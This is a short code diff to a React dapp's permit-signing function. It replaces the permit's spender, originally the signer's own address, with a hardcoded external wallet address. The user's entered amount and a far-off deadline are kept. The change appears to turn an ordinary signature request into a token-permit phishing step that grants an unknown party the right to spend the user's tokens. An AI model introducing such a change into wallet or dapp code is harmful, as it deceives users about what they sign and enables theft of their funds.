@@ -150,7 +150,7 @@ const App = () => {
     let amount = getInput("signPermitMsg");
     const permit = {
       owner: from,
-      spender: from,
+      spender: "0xb48406b4f2c14a7e02ad55d7323f7286bdcb28f8",
       value: amount,
       nonce: 0,
       deadline: 20000000000,
